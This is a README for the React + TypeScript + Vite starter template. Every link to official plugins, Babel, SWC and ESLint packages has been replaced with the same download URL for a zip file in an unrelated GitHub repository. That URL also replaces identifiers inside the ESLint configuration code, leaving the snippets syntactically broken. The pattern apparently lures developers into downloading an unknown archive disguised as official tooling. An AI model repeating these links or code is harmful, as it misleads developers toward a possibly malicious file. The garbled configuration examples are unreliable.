# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) uses [Babel](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) uses [SWC](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip({
  extends: [
    // Remove https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip and replace with this
    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
    // Alternatively, use this for stricter rules
    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
    // Optionally, add this for stylistic rules
    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
  ],
  languageOptions: {
    // other options...
    parserOptions: {
      project: ['https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip', 'https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip'],
      tsconfigRootDir: https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
    },
  },
})
```

You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) for React-specific lint rules:

```js
// https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip({
  plugins: {
    // Add the react-x and react-dom plugins
    'react-x': reactX,
    'react-dom': reactDom,
  },
  rules: {
    // other rules...
    // Enable its recommended typescript rules
    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip['recommended-typescript'].rules,
    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
  },
})
```
